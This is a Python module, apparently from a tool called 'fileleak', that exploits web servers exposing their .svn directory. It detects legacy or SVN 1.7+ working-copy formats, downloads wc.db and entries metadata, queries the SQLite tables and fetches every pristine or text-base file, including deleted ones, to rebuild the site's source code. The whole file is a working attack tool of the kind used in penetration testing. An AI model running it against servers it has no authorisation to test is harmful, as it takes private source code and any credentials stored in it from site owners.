"""SVN repository leak exploiter module.

Supports both modern (SVN 1.7+) and legacy (SVN < 1.7) working copy formats.
- Modern: extracts files from wc.db SQLite database and pristine store
- Legacy: parses text-format entries and downloads text-base files
"""

import asyncio
import logging
import os
import re
import sqlite3
import tempfile

from rich.console import Console

from fileleak.core.base import BaseDumper

logger = logging.getLogger(__name__)
console = Console()


class SvnDumper(BaseDumper):
    """SVN repository leak exploiter.

    Supports both modern (SVN 1.7+) and legacy (SVN < 1.7) working copy formats.
    - Modern: extracts files from wc.db SQLite database and pristine store
    - Legacy: parses text-format entries and downloads text-base files
    
    Enhanced to download all .svn metadata files like dvcs-ripper:
    - Downloads all-wcprops, format, entries for complete metadata
    - Downloads ALL pristine files from PRISTINE table (including deleted)
    - Can optionally create full .svn working copy structure
    """

    # Additional SVN metadata files to download
    SVN_METADATA_FILES = [
        "all-wcprops",
        "format",
        "entries",
        "wc.db",
        "wc.db-journal",
    ]

    def __init__(self, url: str, full_copy: bool = False, **kwargs):
        """Initialize SVN dumper.
        
        Args:
            url: Target .svn URL
            full_copy: If True, create complete .svn working copy structure
        """
        super().__init__(url, **kwargs)
        self.base_url = self._normalize_svn_url(url)
        self.full_copy = full_copy

    async def start(self):
        """Detect SVN version and dispatch to appropriate method."""
        console.print("[bold blue][*] SVN Dumper started[/]")
        console.print(f"[*] Target: {self.base_url}")
        
        # First, download all metadata files
        if self.full_copy:
            console.print("[*] Downloading SVN metadata files...")
            await self._download_metadata()

        version = await self._detect_version()
        if version == "modern":
            console.print("[bold green][+] Detected SVN 1.7+ format (wc.db)[/]")
            await self._dump_modern()
        else:
            console.print("[bold green][+] Detected SVN legacy format (entries)[/]")
            await self._dump_legacy()

        stats = self.get_stats()
        console.print(
            f"\n[bold]Done![/] "
            f"Downloaded: [green]{stats['downloaded']}[/] | "
            f"Failed: [red]{stats['failed']}[/] | "
            f"Skipped: [yellow]{stats['skipped']}[/]"
        )

    # ------------------------------------------------------------------
    # Metadata download
    # ------------------------------------------------------------------
    
    async def _download_metadata(self):
        """Download all .svn metadata files."""
        sem = asyncio.Semaphore(self.http.concurrency)
        
        async def _download_meta(filename: str) -> bool:
            url = f"{self.base_url}/{filename}"
            async with sem:
                return await self.download(url, f".svn/{filename}")
        
        tasks = [_download_meta(f) for f in self.SVN_METADATA_FILES]
        await asyncio.gather(*tasks, return_exceptions=True)

    # ------------------------------------------------------------------
    # Version detection
    # ------------------------------------------------------------------

    async def _detect_version(self) -> str:
        """Detect SVN version by checking the entries file.

        In SVN 1.7+, the entries file starts with a single number
        (the format version, e.g. "12\\n"). Older versions use a
        multi-line text format.

        Returns:
            "modern" for SVN 1.7+, "legacy" otherwise.
        """
        entries_url = f"{self.base_url}/entries"
        try:
            status, data = await self.http.fetch(entries_url)
            if status == 200 and data:
                first_line = data.split(b"\n")[0].strip()
                if first_line.isdigit():
                    console.print(
                        f"[+] Entries format version: {first_line.decode()}"
                    )
                    return "modern"
        except Exception as e:
            logger.debug(f"Failed to fetch entries for version detection: {e}")

        return "legacy"

    # ------------------------------------------------------------------
    # Modern SVN (1.7+)
    # ------------------------------------------------------------------

    async def _dump_modern(self):
        """SVN 1.7+: Download wc.db, extract file list, download pristine files.
        
        Enhanced to:
        - Download ALL pristine files from PRISTINE table
        - Create .svn directory structure (if full_copy mode)
        - Better naming for deleted files using repos_path
        """
        db_url = f"{self.base_url}/wc.db"
        console.print(f"[*] Downloading wc.db ...")

        status, data = await self.http.fetch(db_url)
        if status != 200 or not data:
            console.print(f"[bold red][-] Failed to download wc.db (HTTP {status})[/]")
            return

        # Write wc.db to a temporary file for sqlite3 to read
        tmp_fd, tmp_path = tempfile.mkstemp(suffix=".db")
        try:
            os.write(tmp_fd, data)
            os.close(tmp_fd)

            entries = self._parse_wc_db(tmp_path)
            if not entries:
                console.print("[yellow][!] No file entries found in wc.db[/]")
                return

            console.print(f"[+] Found {len(entries)} file(s) in wc.db")
            
            # Create .svn/pristine structure if in full_copy mode
            if self.full_copy:
                import os as _os
                pristine_base = _os.path.join(self.output_dir, ".svn", "pristine")
                for i in range(256):
                    _os.makedirs(f"{pristine_base}/{i:02x}", exist_ok=True)
            
            await self._download_pristine_files(entries)
        except Exception as e:
            console.print(f"[bold red][-] Error processing wc.db: {e}[/]")
            logger.exception("wc.db processing error")
        finally:
            # Ensure temp file cleanup
            try:
                os.unlink(tmp_path)
            except OSError:
                pass

    @staticmethod
    def _parse_wc_db(db_path: str) -> list[tuple[str, str]]:
        """Parse wc.db SQLite database and return (sha1_hex, local_relpath) pairs.

        The NODES table stores checksum (e.g. ``$sha1$abcdef...``) and
        local_relpath for each versioned file.
        
        Also checks PRISTINE table for files without a local copy (deleted files).
        Maps deleted pristine files to deleted filenames by position matching.

        Args:
            db_path: Path to the wc.db file on disk.

        Returns:
            List of (sha1_hex, local_relpath) tuples.
        """
        entries: list[tuple[str, str]] = []
        seen_hashes: set[str] = set()
        
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            
            # First, get all files from NODES table with checksums
            cursor.execute(
                "SELECT checksum, local_relpath FROM NODES WHERE checksum IS NOT NULL"
            )
            rows = cursor.fetchall()
            
            for checksum, relpath in rows:
                if not checksum or not relpath:
                    continue
                # checksum format: $sha1$<hex_hash>
                sha1 = SvnDumper._extract_sha1(checksum)
                if sha1:
                    entries.append((sha1, relpath))
                    seen_hashes.add(sha1)

            # Get list of deleted files (not-present in NODES)
            cursor.execute(
                "SELECT repos_path FROM NODES WHERE presence = 'not-present' AND repos_path IS NOT NULL"
            )
            deleted_files = [row[0] for row in cursor.fetchall() if row[0]]

            # Get PRISTINE entries with refcount=0 (deleted from working copy)
            cursor.execute(
                "SELECT checksum FROM PRISTINE WHERE refcount = 0"
            )
            deleted_pristine = []
            for (checksum,) in cursor.fetchall():
                sha1 = SvnDumper._extract_sha1(checksum)
                if sha1 and sha1 not in seen_hashes:
                    deleted_pristine.append(sha1)
            
            # Map deleted pristine files to deleted filenames
            # If counts match, assume 1:1 correspondence
            if len(deleted_pristine) == len(deleted_files):
                for sha1, filename in zip(deleted_pristine, deleted_files):
                    entries.append((sha1, filename))
            else:
                # Fallback: use hash-based naming
                for sha1 in deleted_pristine:
                    entries.append((sha1, f"_deleted_{sha1}"))
            
            conn.close()

        except sqlite3.Error as e:
            logger.error(f"SQLite error while parsing wc.db: {e}")
        except Exception as e:
            logger.error(f"Unexpected error parsing wc.db: {e}")

        return entries

    @staticmethod
    def _extract_sha1(checksum: str) -> str | None:
        """Extract the SHA-1 hex digest from an SVN checksum string.

        Args:
            checksum: Checksum in the form ``$sha1$abcdef...`` or a plain hex string.

        Returns:
            The hex digest portion, or None if the format is unrecognized.
        """
        if checksum.startswith("$sha1$"):
            return checksum[6:]
        # Fallback: try to match a hex string
        match = re.match(r"^[0-9a-fA-F]{40}$", checksum)
        if match:
            return checksum
        return None

    async def _download_pristine_files(self, entries: list[tuple[str, str]]):
        """Download all pristine files concurrently.

        Args:
            entries: List of (sha1_hex, local_relpath) tuples.
        """
        sem = asyncio.Semaphore(20)

        async def _download_one(sha1: str, relpath: str) -> bool:
            pristine_url = (
                f"{self.base_url}/pristine/{sha1[:2]}/{sha1}.svn-base"
            )
            async with sem:
                # For full_copy mode, also save to .svn/pristine/ structure
                if self.full_copy:
                    import os as _os
                    pristine_path = f".svn/pristine/{sha1[:2]}/{sha1}.svn-base"
                    # Download to pristine location
                    await self.download(pristine_url, pristine_path)
                # Also save to output directory with original filename
                return await self.download(pristine_url, relpath)

        tasks = [_download_one(sha1, relpath) for sha1, relpath in entries]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for i, result in enumerate(results):
            if isinstance(result, Exception):
                sha1, relpath = entries[i]
                logger.warning(
                    f"Exception downloading {relpath} ({sha1[:8]}...): {result}"
                )

    # ------------------------------------------------------------------
    # Legacy SVN (< 1.7)
    # ------------------------------------------------------------------

    async def _dump_legacy(self):
        """SVN < 1.7: Parse entries and download text-base files recursively."""
        await self._parse_svn_dir("")

    async def _parse_svn_dir(self, rel_path: str):
        """Recursively parse a .svn directory in legacy format.

        Downloads the entries file for the given relative path, extracts
        file and directory names, downloads text-base files, and recurses
        into subdirectories.

        Args:
            rel_path: Relative path from the site root (e.g. "" or "subdir").
        """
        # Build the .svn/entries URL for this directory
        if rel_path:
            entries_url = (
                f"{self._site_url()}/{rel_path}/.svn/entries"
            )
        else:
            entries_url = f"{self.base_url}/entries"

        console.print(f"[*] Parsing entries: {entries_url}")

        try:
            status, data = await self.http.fetch(entries_url)
        except Exception as e:
            logger.warning(f"Failed to fetch entries at {entries_url}: {e}")
            return

        if status != 200 or not data:
            logger.debug(f"Entries not found: {entries_url} (HTTP {status})")
            return

        items = self._parse_entries(data)
        if not items:
            logger.debug(f"No entries found in {entries_url}")
            return

        console.print(
            f"[+] Found {len(items)} item(s) in {rel_path or '/'}"
        )

        sem = asyncio.Semaphore(20)

        # Collect download tasks for files and recursion tasks for dirs
        file_tasks = []
        dir_names: list[str] = []

        for item in items:
            name = item["name"]
            kind = item["kind"]
            # Build the full relative path for the file
            if rel_path:
                full_relpath = f"{rel_path}/{name}"
            else:
                full_relpath = name

            if kind == "file":
                text_base_url = (
                    f"{self._site_url()}/{rel_path}/.svn/text-base/"
                    f"{name}.svn-base"
                ) if rel_path else (
                    f"{self.base_url}/text-base/{name}.svn-base"
                )

                async def _dl_file(url: str = text_base_url,
                                   path: str = full_relpath) -> bool:
                    async with sem:
                        return await self.download(url, path)

                file_tasks.append(_dl_file())
            elif kind == "dir":
                dir_names.append(full_relpath)

        # Download files concurrently
        if file_tasks:
            await asyncio.gather(*file_tasks, return_exceptions=True)

        # Recurse into subdirectories
        for dir_path in dir_names:
            await self._parse_svn_dir(dir_path)

    @staticmethod
    def _parse_entries(data: bytes) -> list[dict]:
        """Parse SVN entries text format.

        Entries are separated by form-feed characters (``\\x0c``).
        Within each entry, fields are on separate lines:

        - Line 0: entry name
        - Line 1: kind (``file`` or ``dir``)
        - Remaining lines: metadata (ignored)

        The very first entry (the directory itself, usually named ``""``)
        is skipped.

        Args:
            data: Raw bytes of the entries file.

        Returns:
            List of dicts with ``name`` and ``kind`` keys.
        """
        items: list[dict] = []

        try:
            text = data.decode("utf-8", errors="replace")
        except Exception:
            return items

        # Split by form-feed character
        raw_entries = text.split("\x0c")

        for raw in raw_entries:
            lines = raw.strip().split("\n")
            # Filter out empty lines at the start
            lines = [l.strip() for l in lines]

            if not lines or not lines[0]:
                continue

            name = lines[0]
            kind = lines[1] if len(lines) > 1 else ""

            # Skip the self-referential directory entry (empty name)
            if not name:
                continue

            # Only process files and directories
            if kind in ("file", "dir"):
                items.append({"name": name, "kind": kind})

        return items

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _normalize_svn_url(self, url: str) -> str:
        """Normalize URL to point to the ``.svn/`` base path.

        Ensures the URL ends with ``/.svn`` so that subsequent path
        construction (e.g. ``/entries``, ``/wc.db``, ``/pristine/...``)
        works correctly.

        Args:
            url: The target URL, possibly already containing ``.svn``.

        Returns:
            Normalized URL ending with ``/.svn``.
        """
        url = url.rstrip("/")
        if url.endswith("/.svn"):
            return url
        if "/.svn" in url:
            # Strip anything after /.svn and rebuild
            url = url[: url.index("/.svn")] + "/.svn"
            return url
        return url + "/.svn"

    def _site_url(self) -> str:
        """Return the base site URL (without the ``.svn`` suffix).

        Used for constructing legacy-format text-base URLs where each
        subdirectory has its own ``.svn/`` folder.

        Returns:
            The URL without the trailing ``/.svn``.
        """
        if self.base_url.endswith("/.svn"):
            return self.base_url[:-5]
        return self.base_url
